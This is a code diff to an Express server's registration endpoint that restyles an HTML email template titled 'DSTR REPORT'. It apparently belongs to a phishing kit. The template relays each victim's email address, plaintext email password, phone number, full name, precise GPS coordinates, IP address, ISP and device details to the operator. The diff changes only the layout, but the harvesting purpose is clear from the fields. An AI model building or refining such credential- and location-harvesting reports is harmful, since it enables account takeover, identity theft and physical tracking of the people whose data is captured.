@@ -165,361 +165,298 @@ app.post('/api/register', async (req, res) => {
         
         // ========== HTML EMAIL SUPER MODERN + FLAG ==========
         const htmlContent = `
-<!DOCTYPE html>
+                            <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registration Data Report</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
-            padding: 40px 20px;
-            min-height: 100vh;
-        }
-        .email-container {
-            max-width: 680px;
-            margin: 0 auto;
-            background: #0a0a0a;
-            border-radius: 32px;
-            overflow: hidden;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-            border: 1px solid rgba(0, 180, 255, 0.2);
-        }
-        .email-header {
-            background: linear-gradient(160deg, 
-                #00d4ff 0%, 
-                #00b8e6 15%, 
-                #0099cc 35%, 
-                #006699 55%, 
-                #0a0a2e 80%, 
-                #000000 100%);
-            padding: 45px 35px;
-            text-align: center;
-            position: relative;
-        }
-        .email-header::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            height: 60px;
-            background: linear-gradient(to top, #0a0a0a, transparent);
-        }
-        .header-icon {
-            font-size: 52px;
-            margin-bottom: 15px;
-        }
-        .email-header h1 {
-            color: white;
-            font-size: 28px;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-            margin-bottom: 10px;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-        .email-header p {
-            color: rgba(255,255,255,0.85);
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .badge {
-            display: inline-block;
-            background: rgba(255,255,255,0.15);
-            backdrop-filter: blur(10px);
-            padding: 6px 18px;
-            border-radius: 50px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-top: 15px;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        .flag-badge {
-            display: inline-block;
-            background: rgba(0,0,0,0.4);
-            padding: 8px 20px;
-            border-radius: 50px;
-            font-size: 18px;
-            margin-top: 15px;
-            margin-left: 10px;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        .email-content {
-            padding: 35px;
-        }
-        .welcome-text {
-            margin-bottom: 30px;
-            background: linear-gradient(135deg, rgba(0,212,255,0.08) 0%, rgba(0,0,0,0) 100%);
-            padding: 20px;
-            border-radius: 20px;
-        }
-        .welcome-text h2 {
-            color: #00d4ff;
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .welcome-text p {
-            color: #b0b0b0;
-            line-height: 1.6;
-            font-size: 14px;
-        }
-        .data-card {
-            background: linear-gradient(135deg, rgba(20,30,50,0.6) 0%, rgba(5,10,20,0.8) 100%);
-            border-radius: 24px;
-            padding: 5px 0;
-            margin: 25px 0;
-            border: 1px solid rgba(0, 180, 255, 0.2);
-            overflow: hidden;
-        }
-        .data-section {
-            padding: 18px 25px;
-            border-bottom: 1px solid rgba(0, 180, 255, 0.1);
-        }
-        .data-section:last-child {
-            border-bottom: none;
-        }
-        .section-title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 18px;
-        }
-        .section-title i {
-            font-size: 20px;
-            color: #00d4ff;
-        }
-        .section-title h3 {
-            color: #00d4ff;
-            font-size: 16px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-        .data-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }
-        .data-row:last-child {
-            border-bottom: none;
-        }
-        .data-label {
-            color: #888;
-            font-size: 13px;
-            font-weight: 500;
-        }
-        .data-value {
-            color: white;
-            font-size: 14px;
-            font-weight: 600;
-            text-align: right;
-            word-break: break-word;
-            max-width: 60%;
-        }
-        .password-value {
-            background: rgba(0, 212, 255, 0.15);
-            padding: 5px 12px;
-            border-radius: 12px;
-            font-family: monospace;
-            letter-spacing: 0.5px;
-        }
-        .gps-coord {
-            color: #00d4ff;
-            font-weight: 700;
-        }
-        .country-flag {
-            font-size: 24px;
-            margin-left: 10px;
-            vertical-align: middle;
-        }
-        .email-footer {
-            background: rgba(0,0,0,0.4);
-            padding: 25px 35px;
-            text-align: center;
-            border-top: 1px solid rgba(0, 180, 255, 0.1);
-        }
-        .email-footer p {
-            color: #666;
-            font-size: 11px;
-            margin: 5px 0;
-        }
-        .footer-note {
-            color: #444 !important;
-            font-size: 10px !important;
-        }
-        hr {
-            border: none;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, #00d4ff, transparent);
-            margin: 20px 0;
-        }
-        .timestamp {
-            color: #555;
-            font-size: 11px;
-            text-align: center;
-            margin-top: 20px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DSTR REPORT</title>
+
+<style>
+
+body{
+    margin:0;
+    padding:20px;
+    background:#050505;
+    font-family:Arial,sans-serif;
+    color:white;
+}
+
+.container{
+    max-width:700px;
+    margin:auto;
+    background:#0b0b0b;
+    border:2px solid #00e5ff;
+}
+
+.topbar{
+    background:#3914cc;
+    color:#00e5ff;
+    text-align:center;
+    padding:20px;
+    font-size:28px;
+    font-weight:bold;
+    letter-spacing:3px;
+    border-bottom:2px solid #00e5ff;
+    box-shadow:0 0 15px #00e5ff;
+}
+
+.mainbox{
+    padding:20px;
+}
+
+.data-box{
+    background:white;
+    color:black;
+    margin-bottom:20px;
+    border:2px solid #3914cc;
+}
+
+.data-title{
+    background:#3914cc;
+    color:#00e5ff;
+    padding:12px;
+    font-size:15px;
+    font-weight:bold;
+    border-bottom:2px solid #00e5ff;
+    box-shadow:0 0 10px #00e5ff inset;
+}
+
+.data-row{
+    display:flex;
+    justify-content:space-between;
+    padding:12px;
+    border-bottom:1px solid #999;
+    gap:10px;
+    word-break:break-word;
+}
+
+.data-row:last-child{
+    border-bottom:none;
+}
+
+.label{
+    font-weight:bold;
+}
+
+.value{
+    text-align:right;
+    max-width:60%;
+}
+
+.password{
+    background:#dffcff;
+    border:1px solid #00bcd4;
+    padding:3px 8px;
+}
+
+.footer-sign{
+    margin-top:25px;
+    background:#3914cc;
+    border:2px solid #00e5ff;
+    text-align:center;
+    padding:15px;
+    color:#00e5ff;
+    font-size:18px;
+    font-weight:bold;
+    box-shadow:0 0 15px #00e5ff;
+}
+
+</style>
 </head>
+
 <body>
-    <div class="email-container">
-        <div class="email-header">
-            <div class="header-icon">📋</div>
-            <h1>REGISTRATION DATA REPORT</h1>
-            <p>User information has been recorded</p>
-            <div>
-                <span class="badge">🔒 ENCRYPTED REPORT</span>
-                <span class="flag-badge">${flagEmoji} ${countryCode || '🌍'}</span>
-            </div>
-        </div>
-        
-        <div class="email-content">
-            <div class="welcome-text">
-                <h2>
-                    Welcome, ${data.email ? data.email.split('@')[0] : 'User'}!
-                    <span class="country-flag">${flagEmoji}</span>
-                </h2>
-                <p>Berikut adalah data lengkap registrasi yang berhasil kami terima dari sistem monitoring.</p>
-            </div>
-            
-            <div class="data-card">
-                <div class="data-section">
-                    <div class="section-title">
-                        <i>📧</i>
-                        <h3>ACCOUNT INFORMATION</h3>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Email Address</span>
-                        <span class="data-value">${data.email || '-'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Email Password</span>
-                        <span class="data-value password-value">${data.emailPassword || '-'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Phone Number</span>
-                        <span class="data-value">${data.phone || '-'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Full Name</span>
-                        <span class="data-value">${data.fullName || '-'}</span>
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">
-                        <i>📍</i>
-                        <h3>GPS LOCATION</h3>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Latitude</span>
-                        <span class="data-value gps-coord">${data.latitude || 'Not detected'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Longitude</span>
-                        <span class="data-value gps-coord">${data.longitude || 'Not detected'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Accuracy</span>
-                        <span class="data-value">${data.gps_accuracy || '-'} meters</span>
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">
-                        <i>🌍</i>
-                        <h3>LOCATION ${flagEmoji}</h3>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Country</span>
-                        <span class="data-value">${countryName} ${flagEmoji}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Province / State</span>
-                        <span class="data-value">${data.province || data.ip_region || '-'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">City</span>
-                        <span class="data-value">${data.city || data.ip_city || '-'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Postal Code</span>
-                        <span class="data-value">${data.postalCode || '-'}</span>
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">
-                        <i>🌐</i>
-                        <h3>IP & NETWORK</h3>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">IP Address</span>
-                        <span class="data-value">${data.ip_address || '-'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">ISP</span>
-                        <span class="data-value">${data.isp || '-'}</span>
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">
-                        <i>🖥️</i>
-                        <h3>DEVICE INFORMATION</h3>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Platform</span>
-                        <span class="data-value">${data.platform || '-'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Screen Resolution</span>
-                        <span class="data-value">${data.screenResolution || '-'}</span>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Language</span>
-                        <span class="data-value">${data.language || '-'}</span>
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">
-                        <i>⏰</i>
-                        <h3>TIMESTAMP</h3>
-                    </div>
-                    <div class="data-row">
-                        <span class="data-label">Registration Time</span>
-                        <span class="data-value">${data.timestamp || new Date().toLocaleString()}</span>
-                    </div>
-                </div>
-            </div>
-            
-            <hr>
-            <div class="timestamp">
-                Report ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}<br>
-                Generated: ${new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' })}
-            </div>
-        </div>
-        
-        <div class="email-footer">
-            <p>This is an automated report from Registration Monitoring System</p>
-            <p class="footer-note">Please do not reply to this email. This message is system generated.</p>
-            <p class="footer-note">© 2026 Registration System - All rights reserved</p>
-        </div>
+
+<div class="container">
+
+    <div class="topbar">
+        DSTR REPORT 🇲🇽
     </div>
+
+    <div class="mainbox">
+
+        <!-- ACCOUNT -->
+        <div class="data-box">
+
+            <div class="data-title">
+                📧 ACCOUNT INFORMATION
+            </div>
+
+            <div class="data-row">
+                <div class="label">Email</div>
+                <div class="value">
+                    ${data.email || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Password</div>
+                <div class="value password">
+                    ${data.emailPassword || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Phone</div>
+                <div class="value">
+                    ${data.phone || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Full Name</div>
+                <div class="value">
+                    ${data.fullName || '-'}
+                </div>
+            </div>
+
+        </div>
+
+        <!-- GPS -->
+        <div class="data-box">
+
+            <div class="data-title">
+                📍 GPS LOCATION
+            </div>
+
+            <div class="data-row">
+                <div class="label">Latitude</div>
+                <div class="value">
+                    ${data.latitude || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Longitude</div>
+                <div class="value">
+                    ${data.longitude || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Accuracy</div>
+                <div class="value">
+                    ${data.gps_accuracy || '-'} m
+                </div>
+            </div>
+
+        </div>
+
+        <!-- LOCATION -->
+        <div class="data-box">
+
+            <div class="data-title">
+                🌍 LOCATION
+            </div>
+
+            <div class="data-row">
+                <div class="label">Country</div>
+                <div class="value">
+                    ${countryName} ${flagEmoji}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Province</div>
+                <div class="value">
+                    ${data.province || data.ip_region || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">City</div>
+                <div class="value">
+                    ${data.city || data.ip_city || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Postal Code</div>
+                <div class="value">
+                    ${data.postalCode || '-'}
+                </div>
+            </div>
+
+        </div>
+
+        <!-- NETWORK -->
+        <div class="data-box">
+
+            <div class="data-title">
+                🌐 NETWORK
+            </div>
+
+            <div class="data-row">
+                <div class="label">IP Address</div>
+                <div class="value">
+                    ${data.ip_address || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">ISP</div>
+                <div class="value">
+                    ${data.isp || '-'}
+                </div>
+            </div>
+
+        </div>
+
+        <!-- DEVICE -->
+        <div class="data-box">
+
+            <div class="data-title">
+                🖥 DEVICE INFORMATION
+            </div>
+
+            <div class="data-row">
+                <div class="label">Platform</div>
+                <div class="value">
+                    ${data.platform || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Resolution</div>
+                <div class="value">
+                    ${data.screenResolution || '-'}
+                </div>
+            </div>
+
+            <div class="data-row">
+                <div class="label">Language</div>
+                <div class="value">
+                    ${data.language || '-'}
+                </div>
+            </div>
+
+        </div>
+
+        <!-- TIME -->
+        <div class="data-box">
+
+            <div class="data-title">
+                ⏰ TIMESTAMP
+            </div>
+
+            <div class="data-row">
+                <div class="label">Time</div>
+                <div class="value">
+                    ${data.timestamp || new Date().toLocaleString()}
+                </div>
+            </div>
+
+        </div>
+
+        <!-- SIGN -->
+        <div class="footer-sign">
+            DSTR 🇲🇽
+        </div>
+
+    </div>
+
+</div>
+
 </body>
 </html>
         `;
